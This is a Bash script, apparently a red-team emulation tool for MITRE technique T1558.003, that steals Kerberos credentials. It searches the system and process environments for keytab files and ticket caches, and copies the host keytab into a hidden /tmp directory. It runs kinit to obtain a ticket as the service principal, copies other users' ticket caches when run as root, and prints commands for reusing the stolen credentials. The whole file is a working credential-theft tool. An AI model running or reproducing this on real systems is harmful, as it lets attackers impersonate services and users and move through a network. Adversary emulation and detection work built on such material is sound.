#!/bin/bash
# T1558.003 — Steal or Forge Kerberos Tickets: Keytab Theft
# Steal keytab files for passwordless service authentication

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_keytab"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1558.003 — Kerberos Keytab Theft           ║"
    echo "  ║   Passwordless auth via stolen keytabs         ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

find_keytabs() {
    echo -e "${CYAN}[*] Searching for Kerberos keytab files...${NC}"
    echo ""

    # Standard locations
    echo -e "  ${YELLOW}Standard keytab locations:${NC}"
    local KEYTABS=(
        "/etc/krb5.keytab"
        "/etc/security/keytab"
        "/var/kerberos/krb5kdc/.k5.*"
        "/tmp/krb5cc_*"
    )

    for kt in "${KEYTABS[@]}"; do
        for f in $kt; do
            [[ -f "$f" ]] && echo -e "    ${GREEN}${f}${NC} ($(stat -c '%U:%G %a' "$f" 2>/dev/null))"
        done
    done

    # Search for any .keytab files
    echo ""
    echo -e "  ${YELLOW}Additional keytab files found:${NC}"
    find / -name "*.keytab" -o -name "krb5.keytab*" -o -name ".k5*" 2>/dev/null | \
        grep -v "^/proc" | while read -r f; do
        echo -e "    ${GREEN}${f}${NC} ($(stat -c '%U:%G %a' "$f" 2>/dev/null))"
    done

    # Check for ticket caches
    echo ""
    echo -e "  ${YELLOW}Kerberos ticket caches:${NC}"
    find /tmp -name "krb5cc_*" 2>/dev/null | while read -r f; do
        local uid
        uid=$(echo "$f" | grep -oP 'krb5cc_\K[0-9]+')
        local user
        user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1)
        echo -e "    ${GREEN}${f}${NC} (${user:-uid=$uid})"
    done

    # Check environment for non-standard paths
    echo ""
    echo -e "  ${YELLOW}From process environments (KRB5_KTNAME):${NC}"
    grep -rh "KRB5_KTNAME\|KRB5CCNAME" /proc/*/environ 2>/dev/null | tr '\0' '\n' | sort -u | \
        while read -r line; do
            echo -e "    ${GREEN}${line}${NC}"
        done
}

steal_keytab() {
    echo -e "${CYAN}[*] Stealing keytab and demonstrating usage${NC}"
    echo ""

    mkdir -p "$WORKDIR"

    # Find best keytab
    local TARGET=""
    if [[ -f /etc/krb5.keytab && -r /etc/krb5.keytab ]]; then
        TARGET="/etc/krb5.keytab"
    else
        read -p "  Path to keytab file: " TARGET
        [[ -z "$TARGET" || ! -f "$TARGET" ]] && { echo -e "${RED}[!] Keytab not found${NC}"; return; }
    fi

    # Copy keytab
    cp "$TARGET" "${WORKDIR}/stolen.keytab" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Cannot read keytab (insufficient permissions)${NC}"
        return
    fi
    chmod 600 "${WORKDIR}/stolen.keytab"

    echo -e "${GREEN}[+] Keytab copied to: ${WORKDIR}/stolen.keytab${NC}"
    echo ""

    # List principals in keytab
    echo -e "  ${YELLOW}Principals in stolen keytab:${NC}"
    if command -v klist &>/dev/null; then
        klist -kte "${WORKDIR}/stolen.keytab" 2>/dev/null | tail -n +4 | while read -r line; do
            echo -e "    ${GREEN}${line}${NC}"
        done
    elif command -v ktutil &>/dev/null; then
        echo "read_kt ${WORKDIR}/stolen.keytab
list
quit" | ktutil 2>/dev/null
    fi

    echo ""
    echo -e "  ${YELLOW}Usage examples:${NC}"
    echo -e "    ${CYAN}# Authenticate as service principal:${NC}"
    echo -e "    kinit -kt ${WORKDIR}/stolen.keytab <principal>"
    echo ""
    echo -e "    ${CYAN}# Use with SSH (if GSSAPI enabled):${NC}"
    echo -e "    KRB5_CLIENT_KTNAME=${WORKDIR}/stolen.keytab ssh -K <host>"
    echo ""
    echo -e "    ${CYAN}# Access services without password:${NC}"
    echo -e "    KRB5CCNAME=/tmp/krb5cc_stolen kinit -kt ${WORKDIR}/stolen.keytab <principal>"

    # Try to get a ticket automatically
    if command -v kinit &>/dev/null; then
        echo ""
        read -p "  Attempt kinit with first principal? [y/N]: " TRY
        if [[ "$TRY" == "y" || "$TRY" == "Y" ]]; then
            local PRINCIPAL
            PRINCIPAL=$(klist -kte "${WORKDIR}/stolen.keytab" 2>/dev/null | awk 'NR>3{print $NF; exit}')
            if [[ -n "$PRINCIPAL" ]]; then
                export KRB5CCNAME="${WORKDIR}/krb5cc_stolen"
                kinit -kt "${WORKDIR}/stolen.keytab" "$PRINCIPAL" 2>/dev/null
                if [[ $? -eq 0 ]]; then
                    echo -e "${GREEN}[+] Got TGT as: ${PRINCIPAL}${NC}"
                    klist 2>/dev/null
                else
                    echo -e "${RED}[!] kinit failed (KDC unreachable or keytab expired)${NC}"
                fi
            fi
        fi
    fi
}

steal_ccache() {
    echo -e "${CYAN}[*] Stealing Kerberos ticket cache files${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required to access other users' caches${NC}"; return; }

    mkdir -p "$WORKDIR"

    find /tmp -name "krb5cc_*" 2>/dev/null | while read -r cache; do
        local uid user basename
        uid=$(echo "$cache" | grep -oP 'krb5cc_\K[0-9]+')
        user=$(getent passwd "$uid" 2>/dev/null | cut -d: -f1)
        basename=$(basename "$cache")
        cp "$cache" "${WORKDIR}/${basename}" 2>/dev/null
        echo -e "  ${GREEN}Copied: ${cache} (${user:-uid=$uid})${NC}"
    done

    echo ""
    echo -e "${YELLOW}[*] Use stolen cache: export KRB5CCNAME=${WORKDIR}/krb5cc_<uid>${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up keytab theft...${NC}"

    rm -rf "$WORKDIR"
    unset KRB5CCNAME

    echo -e "${GREEN}[+] Keytab theft artifacts removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Find keytab files and ticket caches"
    echo -e "  ${CYAN}[2]${NC} Steal keytab and authenticate"
    echo -e "  ${CYAN}[3]${NC} Steal ticket cache files"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "Choose [1-4]: " OPT

    case "$OPT" in
        1) find_keytabs ;;
        2) steal_keytab ;;
        3) steal_ccache ;;
        4) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
